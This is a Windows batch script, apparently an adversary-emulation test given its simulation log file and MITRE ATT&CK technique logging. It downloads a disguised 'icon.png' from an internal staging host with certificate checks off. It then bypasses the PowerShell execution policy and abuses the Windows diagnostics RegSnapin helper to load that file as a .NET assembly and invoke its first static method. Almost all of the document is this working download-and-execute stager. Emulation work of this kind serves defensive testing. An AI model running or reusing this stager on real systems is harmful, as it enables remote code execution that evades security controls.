@echo off
SETLOCAL EnableDelayedExpansion

REM Placeholder constant declarations (random-named SET vars)
SET a1=%APPDATA%\11141\e5266df3
SET a2=6656355c.txt
SET a3=https://10.0.0.49/stage/2/icon.png?11141-7
SET a4=ITZEL-S2BO
SET a5=11141
SET a6=7
SET a7=%PUBLIC%\\macula-simulations.log

REM Cache timestamp at start
SET tsvar=!DATE!/!TIME!

REM Initialize error flag
SET err=0

REM Debug: script start
echo [!tsvar!][DEBUG][!a4!][!a5!]: script_start>> "!a7!" 2>nul

REM ── Step 1: Heartbeat fetch ──
echo [!tsvar!][DEBUG][!a4!][!a5!]: heartbeat_start>> "!a7!" 2>nul
if not exist "!a1!" mkdir "!a1!" 2>nul
curl -k -s -o "!a1!\!a2!" "!a3!"
if errorlevel 1 (
    set err=1
    echo [!tsvar!][DEBUG][!a4!][!a5!]: heartbeat_result=1>> "!a7!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!a4!][!a5!]: heartbeat_result=0>> "!a7!" 2>nul
)
echo [!tsvar!][DEBUG][!a4!][!a5!]: heartbeat_complete>> "!a7!" 2>nul

REM ── Step 2: Change working directory ──
echo [!tsvar!][DEBUG][!a4!][!a5!]: chdir_start>> "!a7!" 2>nul
cd /d "!a1!" >nul 2>&1
echo [!tsvar!][DEBUG][!a4!][!a5!]: chdir_result=0>> "!a7!" 2>nul

REM ── Step 3: Invoke Stage 2 via PowerShell (Assembly loading) ──
echo [!tsvar!][DEBUG][!a4!][!a5!]: pscommand_start>> "!a7!" 2>nul
powershell.exe -nop -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; $n=[AppDomain]::CurrentDomain.GetAssemblies().Count; RegSnapin '%APPDATA%\11141\e5266df3\6656355c.txt'; $asm=([AppDomain]::CurrentDomain.GetAssemblies() | Select-Object -Skip $n -First 1); ($asm.GetExportedTypes() | ForEach-Object { $_.GetMethods([Reflection.BindingFlags]'Public,Static') | Where-Object { $_.GetParameters().Count -eq 0 } } | Select-Object -First 1).Invoke($null,$null)"
if errorlevel 1 (
    set err=1
    echo [!tsvar!][DEBUG][!a4!][!a5!]: pscommand_result=1>> "!a7!" 2>nul
) else (
    echo [!tsvar!][DEBUG][!a4!][!a5!]: pscommand_result=0>> "!a7!" 2>nul
)
echo [!tsvar!][DEBUG][!a4!][!a5!]: pscommand_complete>> "!a7!" 2>nul

REM ── TTP Logging ──
if %err%==0 (
    echo [!tsvar!][TTP][!a4!][!a5!]: T1218^|System Binary Proxy Execution=OK:>> "!a7!" 2>nul
    echo [!tsvar!][TTP][!a4!][!a5!]: T1027^|Obfuscated Files or Information=OK:>> "!a7!" 2>nul
) else (
    echo [!tsvar!][TTP][!a4!][!a5!]: T1218^|System Binary Proxy Execution=FAIL:general_error>> "!a7!" 2>nul
    echo [!tsvar!][TTP][!a4!][!a5!]: T1027^|Obfuscated Files or Information=FAIL:general_error>> "!a7!" 2>nul
)

ENDLOCAL
exit /b